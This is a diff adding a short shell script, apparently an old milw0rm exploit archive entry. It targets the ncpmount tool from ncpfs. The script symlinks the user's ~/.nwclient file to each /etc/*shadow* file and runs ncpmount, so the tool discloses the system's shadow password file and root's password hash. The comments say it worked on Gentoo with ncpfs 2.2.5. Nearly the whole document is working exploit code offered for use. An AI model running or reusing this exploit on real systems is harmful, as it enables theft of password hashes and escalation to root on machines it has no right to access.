@@ -1,0 +1,24 @@
+#!/bin/sh
+## Had to remove local -r to get it to work via sh on my box
+## Root's encrypted password was in toupper form but the
+## super stated it worked fine for him (Gentoo with ncpfs 2.2.5)
+## If it worked for you send an email to info@milw0rm.com /str0ke
+
+(echo  'head1 by super'
+ echo -e '==============\n'
+ (function head1(){
+   (local -r MNTDIR=~/mnt.$$
+     (mv ~/.nwclient ~/.nwclient.temp
+       ln -sf $1 ~/.nwclient
+       mkdir $MNTDIR)2>/dev/null
+     (echo $1
+       ncpmount $MNTDIR
+       echo)
+     (rmdir $MNTDIR
+       rm ~/.nwclient
+       mv .nwclient.temp .nwclient)2>/dev/null)}
+ (for i in /etc/*shadow*
+   do head1 $i
+   done)))#
+
+# milw0rm.com [2005-01-30]
